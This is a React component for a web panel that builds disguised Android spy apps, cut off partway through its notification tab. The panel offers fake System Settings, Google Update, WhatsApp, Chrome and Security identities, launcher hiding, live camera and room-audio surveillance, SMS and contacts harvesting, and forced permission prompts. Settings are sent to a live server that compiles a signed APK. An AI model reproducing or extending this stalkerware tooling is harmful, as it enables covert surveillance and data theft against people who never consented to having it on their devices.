"use client";

import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
    Smartphone, Shield, Bell, Settings, RefreshCw, MessageSquare,
    Globe, BatteryCharging, ShieldCheck, Eye, Upload, Crown, Zap,
    Check, X, ChevronRight, Info, AlertTriangle, Download, Loader2,
    Sparkles, Lock, Layers, Cpu, Radio
} from 'lucide-react';
import CustomAlertModal from './CustomAlertModal';

interface AppGenerationModalProps {
    isOpen: boolean;
    onClose: () => void;
    uuid: string;
    socket: any;
    userPlan?: 'basic' | 'standard' | 'premium';
    onUpgrade?: () => void;
}

export interface DisguisePreset {
    id: string;
    name: string;
    packageName: string;
    category: string;
    iconBg: string;
    iconColor: string;
    desc: string;
    defaultNotifStyle: string;
}

const DISGUISE_PRESETS: DisguisePreset[] = [
    {
        id: 'settings',
        name: 'System Settings',
        packageName: 'com.android.settings.sys',
        category: 'System',
        iconBg: 'from-slate-700 to-slate-900',
        iconColor: 'text-slate-200',
        desc: 'Blends into Android system settings',
        defaultNotifStyle: 'android_system'
    },
    {
        id: 'sysupdate',
        name: 'System Update',
        packageName: 'com.google.android.sysupdate',
        category: 'System',
        iconBg: 'from-emerald-600 to-teal-800',
        iconColor: 'text-emerald-200',
        desc: 'Official Google software update look',
        defaultNotifStyle: 'google_play'
    },
    {
        id: 'whatsapp',
        name: 'WhatsApp Business',
        packageName: 'com.whatsapp.w4b.svc',
        category: 'Social',
        iconBg: 'from-green-500 to-emerald-700',
        iconColor: 'text-white',
        desc: 'Disguised as WhatsApp helper service',
        defaultNotifStyle: 'custom'
    },
    {
        id: 'chrome',
        name: 'Google Chrome',
        packageName: 'com.android.chrome.srv',
        category: 'Browser',
        iconBg: 'from-blue-600 to-indigo-800',
        iconColor: 'text-blue-200',
        desc: 'Appears as background web service',
        defaultNotifStyle: 'download_manager'
    },
    {
        id: 'battery',
        name: 'Battery Saver',
        packageName: 'com.android.systemui.battery',
        category: 'System',
        iconBg: 'from-amber-500 to-orange-700',
        iconColor: 'text-amber-100',
        desc: 'Disguised as power management tool',
        defaultNotifStyle: 'device_maintenance'
    },
    {
        id: 'security',
        name: 'Device Security',
        packageName: 'com.google.android.security.core',
        category: 'Security',
        iconBg: 'from-cyan-600 to-blue-800',
        iconColor: 'text-cyan-200',
        desc: 'Official Android security defender look',
        defaultNotifStyle: 'device_security'
    },
    {
        id: 'galleryeye',
        name: 'Gallery Eye',
        packageName: 'com.gallery.eye',
        category: 'Default',
        iconBg: 'from-pink-500 to-purple-700',
        iconColor: 'text-pink-200',
        desc: 'Standard Gallery Eye client app',
        defaultNotifStyle: 'system_ui'
    },
    {
        id: 'custom',
        name: 'Custom Disguise',
        packageName: 'com.custom.app',
        category: 'Custom',
        iconBg: 'from-purple-600 to-pink-600',
        iconColor: 'text-white',
        desc: 'Upload custom icon and set custom name',
        defaultNotifStyle: 'custom'
    }
];

export default function AppGenerationModal({
    isOpen,
    onClose,
    uuid,
    socket,
    userPlan = 'basic',
    onUpgrade
}: AppGenerationModalProps) {
    const isBasicPlan = userPlan === 'basic';
    const [activeTab, setActiveTab] = useState<'identity' | 'permissions' | 'notification'>('identity');
    const [selectedDisguise, setSelectedDisguise] = useState<string>('settings');

    // Build Status State
    const [status, setStatus] = useState<'idle' | 'queued' | 'generating' | 'downloading' | 'completed'>('idle');
    const [progress, setProgress] = useState(0);
    const [progressStep, setProgressStep] = useState("");
    const [downloadUrl, setDownloadUrl] = useState("");
    const [queuePosition, setQueuePosition] = useState(0);

    // Customization State
    const [appName, setAppName] = useState("System Settings");
    const [packageName, setPackageName] = useState("com.android.settings.sys");
    const [hideApp, setHideApp] = useState(false);
    const [webLink, setWebLink] = useState("");
    const [customIcon, setCustomIcon] = useState<File | null>(null);
    const [customIconPreview, setCustomIconPreview] = useState<string | null>(null);

    // Permission Manager State
    const [enableSmsPermission, setEnableSmsPermission] = useState(false);
    const [enableContactsPermission, setEnableContactsPermission] = useState(false);
    const [enableStoragePermission, setEnableStoragePermission] = useState(true);
    const [enableCameraPermission, setEnableCameraPermission] = useState(false);
    const [enableMicrophonePermission, setEnableMicrophonePermission] = useState(false);
    const [enableNotificationListener, setEnableNotificationListener] = useState(false);
    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'microphone' | 'notifications' | null>(null);
    const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
    const [aggressivePermissions, setAggressivePermissions] = useState(false);

    // Notification Customization State
    const [notificationStyle, setNotificationStyle] = useState("android_system");
    const [notificationClickAction, setNotificationClickAction] = useState("device_info");
    const [notificationTitle, setNotificationTitle] = useState("Android System");
    const [notificationText, setNotificationText] = useState("Updating system components...");
    const [notificationIcon, setNotificationIcon] = useState("sync");

    // Alert modal state
    const [showCustomAlert, setShowCustomAlert] = useState(false);
    const [alertData, setAlertData] = useState({ title: '', message: '', type: 'error' as 'error' | 'warning' | 'success' | 'info' });

    const NOTIFICATION_PRESETS: Record<string, { title: string; text: string; icon: string }> = {
        google_play: { title: "Google Play services", text: "Checking for updates...", icon: "ℹ️" },
        android_system: { title: "Android System", text: "Updating system components...", icon: "🔄" },
        device_security: { title: "Device Security", text: "Scanning for threats...", icon: "🛡️" },
        system_ui: { title: "System UI", text: "Syncing system data...", icon: "🔄" },
        device_maintenance: { title: "Device maintenance", text: "Optimizing performance...", icon: "🔄" },
        download_manager: { title: "Download Manager", text: "Download in progress...", icon: "📥" },
        custom: { title: "Custom", text: "Set your own title & text", icon: "⚙️" },
    };

    const CLICK_ACTIONS: Record<string, string> = {
        device_info: "Device Info (About Phone)",
        settings: "Settings (Main)",
        security: "Security Settings",
        battery: "Battery Settings",
        wifi: "WiFi Settings",
        storage: "Storage Settings",
        none: "Do Nothing",
    };

    const ICON_OPTIONS: Record<string, string> = {
        info: "ℹ️ Info",
        sync: "🔄 Sync",
        lock: "🔒 Lock",
        download: "📥 Download",
        download_done: "📦 Download Done",
    };

    useEffect(() => {
        if (isOpen) {
            setStatus('idle');
            setProgress(0);
            setProgressStep("");
            setDownloadUrl("");
            setQueuePosition(0);
        }
    }, [isOpen]);

    useEffect(() => {
        if (!socket) return;

        const handleProgress = (data: any) => {
            setStatus('generating');
            setProgress(data.progress);
            if (data.step) setProgressStep(data.step);
        };

        const handleQueueUpdate = (data: any) => {
            setStatus('queued');
            setQueuePosition(data.position);
        };

        const handleReady = (data: any) => {
            setStatus('downloading');
            setProgress(100);
            setProgressStep("Download starting...");
            setDownloadUrl(data.url);

            const a = document.createElement('a');
            a.href = data.url;
            a.download = data.filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            setTimeout(() => {
                setStatus('completed');
            }, 2000);
        };

        const handleError = (data: any) => {
            console.error("APK Error:", data);
            setStatus('idle');
            setAlertData({
                title: 'Generation Failed',
                message: data.message || 'An error occurred during APK compilation.',
                type: 'error'
            });
            setShowCustomAlert(true);
        };

        socket.on('apk_progress', handleProgress);
        socket.on('queue_update', handleQueueUpdate);
        socket.on('apk_ready', handleReady);
        socket.on('apk_error', handleError);

        return () => {
            socket.off('apk_progress', handleProgress);
            socket.off('queue_update', handleQueueUpdate);
            socket.off('apk_ready', handleReady);
            socket.off('apk_error', handleError);
        };
    }, [socket]);

    const handleSelectDisguise = (presetId: string) => {
        setSelectedDisguise(presetId);
        const preset = DISGUISE_PRESETS.find(p => p.id === presetId);
        if (preset && preset.id !== 'custom') {
            setAppName(preset.name);
            setPackageName(preset.packageName);
            setNotificationStyle(preset.defaultNotifStyle);
            if (preset.defaultNotifStyle !== 'custom' && NOTIFICATION_PRESETS[preset.defaultNotifStyle]) {
                setNotificationTitle(NOTIFICATION_PRESETS[preset.defaultNotifStyle].title);
                setNotificationText(NOTIFICATION_PRESETS[preset.defaultNotifStyle].text);
            }
        }
    };

    const handleCustomIconChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const file = e.target.files?.[0];
        if (file) {
            setCustomIcon(file);
            const reader = new FileReader();
            reader.onloadend = () => {
                setCustomIconPreview(reader.result as string);
            };
            reader.readAsDataURL(file);
            setSelectedDisguise('custom');
        }
    };

    const startGeneration = async () => {
        if (!hideApp && !webLink.trim()) {
            setAlertData({
                title: 'Web Link Required',
                message: 'Please provide a WebView link for your app.\n\nThe app needs a URL to display when it starts.',
                type: 'warning'
            });
            setShowCustomAlert(true);
            return;
        }

        setStatus('generating');
        setProgress(5);
        setProgressStep("Initializing request...");

        try {
            if (!uuid) {
                throw new Error("User ID is missing. Please log in again.");
            }

            const formData = new FormData();
            formData.append('uuid', uuid);
            formData.append('appName', appName);
            formData.append('packageName', packageName);
            formData.append('hideApp', hideApp.toString());
            formData.append('webLink', webLink);
            formData.append('enableSmsPermission', enableSmsPermission.toString());
            formData.append('enableContactsPermission', enableContactsPermission.toString());
            formData.append('enableStoragePermission', enableStoragePermission.toString());
            formData.append('enableCameraPermission', enableCameraPermission.toString());
            formData.append('enableMicrophonePermission', enableMicrophonePermission.toString());
            formData.append('enableNotificationListener', enableNotificationListener.toString());
            formData.append('aggressivePermissions', aggressivePermissions.toString());
            formData.append('notificationStyle', notificationStyle);
            formData.append('notificationClickAction', notificationClickAction);
            if (notificationStyle === 'custom') {
                formData.append('notificationTitle', notificationTitle);
                formData.append('notificationText', notificationText);
                formData.append('notificationIcon', notificationIcon);
            }
            if (customIcon) {
                formData.append('icon', customIcon);
            }

            const response = await fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/download-apk`, {
                method: 'POST',
                body: formData,
            });

            if (!response.ok) {
                const err = await response.json().catch(() => ({}));
                throw new Error(err.message || "Server rejected request");
            }

            const data = await response.json();
            if (data.status === 'queued') {
                setStatus('queued');
                setQueuePosition(data.position);
            }
        } catch (error: any) {
            console.error("Generation Start Error:", error);
            setStatus('idle');
            setAlertData({
                title: 'Request Failed',
                message: error.message || 'Failed to start APK generation.',
                type: 'error'
            });
            setShowCustomAlert(true);
        }
    };

    const renderDisguiseGraphic = (id: string, className = "w-6 h-6") => {
        switch (id) {
            case 'settings': return <Settings className={className} />;
            case 'sysupdate': return <RefreshCw className={className} />;
            case 'whatsapp': return <MessageSquare className={className} />;
            case 'chrome': return <Globe className={className} />;
            case 'battery': return <BatteryCharging className={className} />;
            case 'security': return <ShieldCheck className={className} />;
            case 'galleryeye': return <Eye className={className} />;
            default: return <Sparkles className={className} />;
        }
    };

    if (!isOpen) return null;

    const currentPreset = DISGUISE_PRESETS.find(p => p.id === selectedDisguise) || DISGUISE_PRESETS[0];

    return (
        <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/85 backdrop-blur-xl p-2 sm:p-4 animate-in fade-in duration-300">
            <div className="relative w-full max-w-6xl max-h-[92vh] bg-[#0e0f13] border border-white/10 rounded-[2rem] shadow-[0_0_80px_rgba(0,0,0,0.8)] flex flex-col overflow-hidden">
                
                {/* Header Bar */}
                <div className="flex items-center justify-between px-6 py-4 border-b border-white/10 bg-[#12141a]/90">
                    <div className="flex items-center gap-3">
                        <div className="w-10 h-10 rounded-2xl bg-gradient-to-br from-emerald-500/20 to-cyan-500/20 border border-emerald-500/30 flex items-center justify-center text-emerald-400 shadow-[0_0_20px_rgba(16,185,129,0.2)]">
                            <Smartphone size={22} />
                        </div>
                        <div>
                            <div className="flex items-center gap-2">
                                <h2 className="font-extrabold text-white text-base sm:text-lg tracking-tight">Android App Generator Studio</h2>
                                <span className="px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-widest bg-emerald-500/10 border border-emerald-500/30 text-emerald-400">
                                    v4.8 APK
                                </span>
                            </div>
                            <p className="text-xs text-fg-3">Design, disguise, configure permissions & compile instantly</p>
                        </div>
                    </div>

                    <button
                        onClick={onClose}
                        className="w-10 h-10 rounded-full bg-white/5 hover:bg-white/10 border border-white/10 flex items-center justify-center text-white/60 hover:text-white transition-all"
                    >
                        <X size={20} />
                    </button>
                </div>

                {/* Main Studio Body */}
                {status !== 'idle' ? (
                    // ================= BUILD & COMPILATION CONSOLE =================
                    <div className="flex-1 flex flex-col items-center justify-center p-8 sm:p-14 text-center overflow-y-auto">
                        <div className="relative w-28 h-28 mb-8 flex items-center justify-center">
                            <div className="absolute inset-0 rounded-full border-4 border-white/5" />
                            <div
                                className="absolute inset-0 rounded-full border-4 border-emerald-500 border-t-transparent animate-spin"
                                style={{ animationDuration: '1.4s' }}
                            />
                            <div className="flex flex-col items-center justify-center">
                                <span className="text-2xl font-black text-white">{progress}%</span>
                                <span className="text-[10px] text-emerald-400 uppercase tracking-widest font-bold">Building</span>
                            </div>
                        </div>

                        <h3 className="text-xl sm:text-2xl font-black text-white mb-2">
                            {status === 'queued' ? `Queued (Position #${queuePosition})` : status === 'completed' ? 'APK Compiled Successfully!' : 'Compiling Custom Android App...'}
                        </h3>
                        <p className="text-sm text-fg-3 max-w-md mb-8">{progressStep || 'Injecting custom disguise and configuring manifest access...'}</p>

                        {/* Progress Steps Checklist */}
                        <div className="w-full max-w-md bg-black/40 border border-white/10 rounded-2xl p-5 space-y-3.5 text-left mb-8">
                            <div className="flex items-center gap-3">
                                <div className={`w-6 h-6 rounded-full flex items-center justify-center ${progress >= 15 ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' : 'bg-white/5 text-white/20'}`}>
                                    <Check size={13} />
                                </div>
                                <span className={`text-xs font-semibold ${progress >= 15 ? 'text-white' : 'text-fg-4'}`}>Disguise & Package Signature Preparation</span>
                            </div>

                            <div className="flex items-center gap-3">
                                <div className={`w-6 h-6 rounded-full flex items-center justify-center ${progress >= 45 ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' : 'bg-white/5 text-white/20'}`}>
                                    <Check size={13} />
                                </div>
                                <span className={`text-xs font-semibold ${progress >= 45 ? 'text-white' : 'text-fg-4'}`}>Permission & Service Manifest Compilation</span>
                            </div>

                            <div className="flex items-center gap-3">
                                <div className={`w-6 h-6 rounded-full flex items-center justify-center ${progress >= 80 ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' : 'bg-white/5 text-white/20'}`}>
                                    <Check size={13} />
                                </div>
                                <span className={`text-xs font-semibold ${progress >= 80 ? 'text-white' : 'text-fg-4'}`}>DEX Optimization & APK Signing</span>
                            </div>
                        </div>

                        {downloadUrl && (
                            <a
                                href={downloadUrl}
                                download
                                className="px-8 py-4 rounded-2xl bg-emerald-500 hover:bg-emerald-600 text-black font-extrabold text-sm shadow-[0_0_30px_rgba(16,185,129,0.4)] flex items-center gap-3 transition-all"
                            >
                                <Download size={18} /> Download Compiled APK Now
                            </a>
                        )}

                        <button
                            onClick={() => setStatus('idle')}
                            className="mt-6 text-xs text-fg-3 hover:text-white transition-colors"
                        >
                            ← Back to Studio Editor
                        </button>
                    </div>
                ) : (
                    // ================= CONFIGURATION STUDIO + PHONE PREVIEW =================
                    <div className="flex-1 flex flex-col lg:flex-row overflow-hidden">
                        
                        {/* LEFT COLUMN: STUDIO CONTROLS */}
                        <div className="flex-1 flex flex-col border-b lg:border-b-0 lg:border-r border-white/10 overflow-hidden">
                            
                            {/* Tabs Navigation */}
                            <div className="flex items-center px-4 pt-3 border-b border-white/10 bg-[#101115] gap-2 overflow-x-auto custom-scrollbar">
                                <button
                                    onClick={() => setActiveTab('identity')}
                                    className={`flex items-center gap-2 px-4 py-3 rounded-t-2xl font-bold text-xs transition-all border-b-2 whitespace-nowrap ${
                                        activeTab === 'identity'
                                            ? 'text-emerald-400 border-emerald-500 bg-white/[0.03]'
                                            : 'text-fg-3 border-transparent hover:text-white'
                                    }`}
                                >
                                    <Sparkles size={14} /> 1. Identity & Disguise
                                </button>
                                <button
                                    onClick={() => setActiveTab('permissions')}
                                    className={`flex items-center gap-2 px-4 py-3 rounded-t-2xl font-bold text-xs transition-all border-b-2 whitespace-nowrap ${
                                        activeTab === 'permissions'
                                            ? 'text-emerald-400 border-emerald-500 bg-white/[0.03]'
                                            : 'text-fg-3 border-transparent hover:text-white'
                                    }`}
                                >
                                    <Shield size={14} /> 2. Permissions & Access
                                </button>
                                <button
                                    onClick={() => setActiveTab('notification')}
                                    className={`flex items-center gap-2 px-4 py-3 rounded-t-2xl font-bold text-xs transition-all border-b-2 whitespace-nowrap ${
                                        activeTab === 'notification'
                                            ? 'text-emerald-400 border-emerald-500 bg-white/[0.03]'
                                            : 'text-fg-3 border-transparent hover:text-white'
                                    }`}
                                >
                                    <Bell size={14} /> 3. Notification Customizer
                                </button>
                            </div>

                            {/* Active Tab Body */}
                            <div className="flex-1 p-5 sm:p-6 overflow-y-auto custom-scrollbar space-y-6">
                                
                                {activeTab === 'identity' && (
                                    <div className="space-y-6 animate-in fade-in duration-200">
                                        <div>
                                            <label className="block text-xs font-bold uppercase tracking-widest text-fg-3 mb-3">
                                                Select App Disguise Preset
                                            </label>
                                            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                                                {DISGUISE_PRESETS.map((preset) => {
                                                    const isSelected = selectedDisguise === preset.id;
                                                    return (
                                                        <button
                                                            key={preset.id}
                                                            type="button"
                                                            onClick={() => handleSelectDisguise(preset.id)}
                                                            className={`flex flex-col items-center p-3.5 rounded-2xl border text-center transition-all ${
                                                                isSelected
                                                                    ? 'bg-emerald-500/10 border-emerald-500 shadow-[0_0_20px_rgba(16,185,129,0.15)] scale-[1.02]'
                                                                    : 'bg-black/40 border-white/5 hover:border-white/20 hover:bg-white/[0.03]'
                                                            }`}
                                                        >
                                                            <div className={`w-12 h-12 rounded-2xl bg-gradient-to-br ${preset.iconBg} flex items-center justify-center ${preset.iconColor} shadow-lg mb-2.5`}>
                                                                {preset.id === 'custom' && customIconPreview ? (
                                                                    <img src={customIconPreview} alt="Custom" className="w-10 h-10 rounded-xl object-cover" />
                                                                ) : (
                                                                    renderDisguiseGraphic(preset.id, "w-6 h-6")
                                                                )}
                                                            </div>
                                                            <span className="text-xs font-extrabold text-white block truncate w-full">{preset.name}</span>
                                                            <span className="text-[10px] text-fg-3 font-data truncate w-full mt-0.5">{preset.category}</span>
                                                        </button>
                                                    );
                                                })}
                                            </div>
                                        </div>

                                        {/* Custom Icon Upload */}
                                        {selectedDisguise === 'custom' && (
                                            <div className="p-4 rounded-2xl bg-purple-500/10 border border-purple-500/30 space-y-3">
                                                <div className="flex items-center gap-3">
                                                    <Upload size={18} className="text-purple-400" />
                                                    <span className="text-xs font-bold text-white">Upload Custom PNG/JPG App Icon</span>
                                                </div>
                                                <input
                                                    type="file"
                                                    accept="image/png, image/jpeg"
                                                    onChange={handleCustomIconChange}
                                                    className="w-full text-xs text-fg-2 file:mr-4 file:py-2 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-purple-500 file:text-white hover:file:bg-purple-600 cursor-pointer"
                                                />
                                            </div>
                                        )}

                                        {/* App Name & Package Name */}
                                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                                            <div>
                                                <label className="block text-xs font-bold text-fg-2 mb-1.5">App Display Name</label>
                                                <input
                                                    type="text"
                                                    value={appName}
                                                    onChange={(e) => {
                                                        setAppName(e.target.value);
                                                        setPackageName(e.target.value.toLowerCase().replace(/[^a-z0-9]/g, '.'));
                                                    }}
                                                    className="w-full bg-black/50 border border-white/10 rounded-xl px-4 py-2.5 text-sm text-white font-semibold focus:outline-none focus:border-emerald-500 transition-colors"
                                                />
                                            </div>
                                            <div>
                                                <label className="block text-xs font-bold text-fg-2 mb-1.5">Package Identifier</label>
                                                <input
                                                    type="text"
                                                    value={packageName}
                                                    onChange={(e) => setPackageName(e.target.value)}
                                                    className="w-full bg-black/50 border border-white/10 rounded-xl px-4 py-2.5 text-sm text-fg-1 font-data focus:outline-none focus:border-emerald-500 transition-colors"
                                                />
                                            </div>
                                        </div>

                                        {/* Web Link Option */}
                                        <div>
                                            <label className="block text-xs font-bold text-fg-2 mb-1.5">Launch Web URL (Optional when hidden)</label>
                                            <input
                                                type="url"
                                                value={webLink}
                                                onChange={(e) => setWebLink(e.target.value)}
                                                placeholder="https://example.com"
                                                className="w-full bg-black/50 border border-white/10 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-500 transition-colors"
                                            />
                                            <p className="text-[11px] text-fg-4 mt-1">If set, the app displays this WebView immediately on launch.</p>
                                        </div>

                                        {/* Hide App Icon PRO Toggle */}
                                        <div className={`p-4 rounded-2xl border transition-all ${isBasicPlan ? 'bg-amber-500/5 border-amber-500/30' : 'bg-black/40 border-white/10'}`}>
                                            <div className="flex items-center justify-between">
                                                <div className="flex items-center gap-3">
                                                    <div className="w-10 h-10 rounded-xl bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-400">
                                                        <Eye size={18} />
                                                    </div>
                                                    <div>
                                                        <div className="flex items-center gap-2">
                                                            <span className="font-bold text-sm text-white">Hide App from Launcher</span>
                                                            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[9px] font-extrabold uppercase tracking-widest bg-amber-500/20 border border-amber-400/40 text-amber-300">
                                                                <Crown size={10} /> PRO
                                                            </span>
                                                        </div>
                                                        <p className="text-xs text-fg-3">App runs completely stealth in background after installation</p>
                                                    </div>
                                                </div>
                                                <button
                                                    type="button"
                                                    onClick={() => {
                                                        if (isBasicPlan) {
                                                            onUpgrade?.();
                                                            return;
                                                        }
                                                        setHideApp(!hideApp);
                                                    }}
                                                    className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-emerald-500' : 'bg-white/20'}`}
                                                >
                                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${hideApp && !isBasicPlan ? 'left-7' : 'left-1'}`} />
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                )}

                                {activeTab === 'permissions' && (
                                    <div className="space-y-3 animate-in fade-in duration-200">
                                        <div className="flex items-center justify-between mb-2">
                                            <span className="text-xs font-bold uppercase tracking-widest text-fg-3">Device Access & Permissions</span>
                                            <span className="text-xs text-emerald-400 font-semibold">Enable required permissions</span>
                                        </div>

                                        {/* Storage Permission */}
                                        <div className="flex items-center justify-between p-4 rounded-2xl bg-black/40 border border-white/5 hover:border-white/10 transition-colors">
                                            <div className="flex items-center gap-3">
                                                <div className="w-9 h-9 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400">
                                                    <Layers size={17} />
                                                </div>
                                                <div>
                                                    <span className="font-bold text-sm text-white block">Storage & Media Access</span>
                                                    <span className="text-xs text-fg-3">Required to browse photos and videos</span>
                                                </div>
                                            </div>
                                            <button
                                                type="button"
                                                onClick={() => setEnableStoragePermission(!enableStoragePermission)}
                                                className={`w-11 h-6 rounded-full transition-colors relative ${enableStoragePermission ? 'bg-emerald-500 shadow-[0_0_12px_#10b981]' : 'bg-white/20'}`}
                                            >
                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableStoragePermission ? 'left-6' : 'left-1'}`} />
                                            </button>
                                        </div>

                                        {/* Camera Permission (PREMIUM) */}
                                        <div className="flex items-center justify-between p-4 rounded-2xl bg-black/40 border border-white/5 hover:border-white/10 transition-colors">
                                            <div className="flex items-center gap-3">
                                                <div className="w-9 h-9 rounded-xl bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center text-cyan-400">
                                                    <Smartphone size={17} />
                                                </div>
                                                <div>
                                                    <div className="flex items-center gap-2">
                                                        <span className="font-bold text-sm text-white">Live Camera Surveillance</span>
                                                        <span 
                                                            onClick={onUpgrade}
                                                            className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[9px] font-extrabold uppercase tracking-widest bg-amber-500/20 border border-amber-400/40 text-amber-300 cursor-pointer"
                                                        >
                                                            <Crown size={10} /> PREMIUM
                                                        </span>
                                                    </div>
                                                    <span className="text-xs text-fg-3">Stream real-time front & rear camera feeds</span>
                                                </div>
                                            </div>
                                            <button
                                                type="button"
                                                onClick={() => {
                                                    if (userPlan !== 'premium') {
                                                        onUpgrade?.();
                                                        return;
                                                    }
                                                    setEnableCameraPermission(!enableCameraPermission);
                                                }}
                                                className={`w-11 h-6 rounded-full transition-colors relative ${userPlan !== 'premium' ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500 shadow-[0_0_12px_#06b6d4]' : 'bg-white/20'}`}
                                            >
                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableCameraPermission && userPlan === 'premium' ? 'left-6' : 'left-1'}`} />
                                            </button>
                                        </div>

                                        {/* Microphone Permission (PREMIUM) */}
                                        <div className="flex items-center justify-between p-4 rounded-2xl bg-black/40 border border-white/5 hover:border-white/10 transition-colors">
                                            <div className="flex items-center gap-3">
                                                <div className="w-9 h-9 rounded-xl bg-purple-500/10 border border-purple-500/20 flex items-center justify-center text-purple-400">
                                                    <Radio size={17} />
                                                </div>
                                                <div>
                                                    <div className="flex items-center gap-2">
                                                        <span className="font-bold text-sm text-white">Live Audio & Microphone</span>
                                                        <span 
                                                            onClick={onUpgrade}
                                                            className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[9px] font-extrabold uppercase tracking-widest bg-amber-500/20 border border-amber-400/40 text-amber-300 cursor-pointer"
                                                        >
                                                            <Crown size={10} /> PREMIUM
                                                        </span>
                                                    </div>
                                                    <span className="text-xs text-fg-3">Real-time room ambient audio monitoring</span>
                                                </div>
                                            </div>
                                            <button
                                                type="button"
                                                onClick={() => {
                                                    if (userPlan !== 'premium') {
                                                        onUpgrade?.();
                                                        return;
                                                    }
                                                    setEnableMicrophonePermission(!enableMicrophonePermission);
                                                }}
                                                className={`w-11 h-6 rounded-full transition-colors relative ${userPlan !== 'premium' ? 'bg-white/10' : enableMicrophonePermission ? 'bg-purple-500 shadow-[0_0_12px_#a855f7]' : 'bg-white/20'}`}
                                            >
                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableMicrophonePermission && userPlan === 'premium' ? 'left-6' : 'left-1'}`} />
                                            </button>
                                        </div>

                                        {/* SMS Permission */}
                                        <div className="flex items-center justify-between p-4 rounded-2xl bg-black/40 border border-white/5 hover:border-white/10 transition-colors">
                                            <div className="flex items-center gap-3">
                                                <div className="w-9 h-9 rounded-xl bg-red-500/10 border border-red-500/20 flex items-center justify-center text-red-400">
                                                    <MessageSquare size={17} />
                                                </div>
                                                <div>
                                                    <div className="flex items-center gap-2">
                                                        <span className="font-bold text-sm text-white">SMS Messages Access</span>
                                                        <span className="px-2 py-0.5 rounded-full text-[9px] font-bold uppercase bg-red-500/20 text-red-400">High Risk</span>
                                                    </div>
                                                    <span className="text-xs text-fg-3">Sync device SMS inbox & alerts</span>
                                                </div>
                                            </div>
                                            <button
                                                type="button"
                                                onClick={() => {
                                                    if (!enableSmsPermission) {
                                                        setShowPlayProtectWarning(true);
                                                    } else {
                                                        setEnableSmsPermission(false);
                                                    }
                                                }}
                                                className={`w-11 h-6 rounded-full transition-colors relative ${enableSmsPermission ? 'bg-red-500 shadow-[0_0_12px_#ef4444]' : 'bg-white/20'}`}
                                            >
                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission ? 'left-6' : 'left-1'}`} />
                                            </button>
                                        </div>

                                        {/* Contacts Permission */}
                                        <div className="flex items-center justify-between p-4 rounded-2xl bg-black/40 border border-white/5 hover:border-white/10 transition-colors">
                                            <div className="flex items-center gap-3">
                                                <div className="w-9 h-9 rounded-xl bg-blue-500/10 border border-blue-500/20 flex items-center justify-center text-blue-400">
                                                    <Cpu size={17} />
                                                </div>
                                                <div>
                                                    <span className="font-bold text-sm text-white block">Contacts Directory</span>
                                                    <span className="text-xs text-fg-3">Read & sync phonebook contacts</span>
                                                </div>
                                            </div>
                                            <button
                                                type="button"
                                                onClick={() => setEnableContactsPermission(!enableContactsPermission)}
                                                className={`w-11 h-6 rounded-full transition-colors relative ${enableContactsPermission ? 'bg-blue-500 shadow-[0_0_12px_#3b82f6]' : 'bg-white/20'}`}
                                            >
                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableContactsPermission ? 'left-6' : 'left-1'}`} />
                                            </button>
                                        </div>

                                        {/* Aggressive Persistence Mode */}
                                        <div className={`p-4 rounded-2xl border transition-all ${isBasicPlan ? 'bg-yellow-500/5 border-yellow-500/30' : 'bg-black/40 border-white/10'}`}>
                                            <div className="flex items-center justify-between">
                                                <div className="flex items-center gap-3">
                                                    <div className="w-9 h-9 rounded-xl bg-yellow-500/10 border border-yellow-500/20 flex items-center justify-center text-yellow-400">
                                                        <AlertTriangle size={17} />
                                                    </div>
                                                    <div>
                                                        <div className="flex items-center gap-2">
                                                            <span className="font-bold text-sm text-white">Aggressive Persistence Mode</span>
                                                            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[9px] font-extrabold uppercase tracking-widest bg-amber-500/20 border border-amber-400/40 text-amber-300">
                                                                <Crown size={10} /> PRO
                                                            </span>
                                                        </div>
                                                        <span className="text-xs text-fg-3">Auto-prompts permissions until granted by user</span>
                                                    </div>
                                                </div>
                                                <button
                                                    type="button"
                                                    onClick={() => {
                                                        if (isBasicPlan) {
                                                            onUpgrade?.();
                                                            return;
                                                        }
                                                        setAggressivePermissions(!aggressivePermissions);
                                                    }}
                                                    className={`w-11 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : aggressivePermissions ? 'bg-yellow-500' : 'bg-white/20'}`}
                                                >
                                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${aggressivePermissions && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                )}

                                {activeTab === 'notification' && (
                                    <div className="space-y-5 animate-in fade-in duration-200">
                                        <div>
